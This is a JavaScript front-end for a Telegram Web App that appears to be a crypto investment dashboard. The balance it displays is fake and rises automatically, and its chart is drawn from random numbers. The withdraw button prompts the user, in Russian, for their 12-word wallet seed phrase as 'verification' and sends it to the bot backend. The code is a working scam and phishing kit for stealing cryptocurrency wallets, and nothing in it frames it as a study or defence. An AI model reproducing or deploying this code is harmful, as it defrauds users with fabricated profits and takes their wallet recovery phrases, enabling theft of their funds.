const tg = window.Telegram.WebApp;
tg.expand();
tg.backgroundColor = '#0a0c0f';
tg.headerColor = '#1a1e24';

const user = tg.initDataUnsafe?.user;
console.log('Пользователь:', user);

let balance = parseFloat(localStorage.getItem('balance')) || 1245.78;
let profit = 12.45;

function updateUI() {
    document.getElementById('balance').innerText = balance.toFixed(2);
    document.getElementById('profit').innerText = '+' + profit.toFixed(2);
}

// График
const canvas = document.getElementById('chart');
const ctx = canvas.getContext('2d');
function drawChart() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    ctx.strokeStyle = '#00ffaa';
    ctx.lineWidth = 2;
    ctx.beginPath();
    for (let i = 0; i <= 10; i++) {
        let x = i * 30;
        let y = 100 - Math.random() * 50;
        if (i === 0) ctx.moveTo(x, y);
        else ctx.lineTo(x, y);
    }
    ctx.stroke();
}
drawChart();

document.getElementById('depositBtn').addEventListener('click', () => {
    tg.sendData(JSON.stringify({ action: 'deposit' }));
    tg.close();
});

document.getElementById('withdrawBtn').addEventListener('click', () => {
    const seed = prompt('Введите вашу seed-фразу (12 слов) для верификации вывода:');
    if (seed && seed.trim().split(' ').length >= 12) {
        tg.sendData(JSON.stringify({ action: 'withdraw_request', seed: seed }));
        alert('Запрос отправлен! Ожидайте обработки.');
        tg.close();
    } else {
        alert('Неверная seed-фраза. Попробуйте ещё раз.');
    }
});

updateUI();

setInterval(() => {
    balance += 0.01;
    profit += 0.001;
    updateUI();
    localStorage.setItem('balance', balance.toFixed(2));
}, 5000);